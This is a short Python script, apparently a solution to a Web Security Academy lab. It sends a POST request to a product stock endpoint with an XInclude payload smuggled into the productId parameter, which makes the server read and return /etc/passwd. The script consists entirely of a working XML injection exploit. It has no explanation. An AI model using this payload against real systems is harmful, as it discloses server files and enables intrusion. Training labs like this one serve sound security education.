import requests
s = requests.Session()

stock_url = 'https://ac0d1f3e1e79822e80f740c700090099.web-security-academy.net/product/stock'
xml_post_data = 'productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1'

resp = s.post(stock_url,data=xml_post_data)
print(resp.text)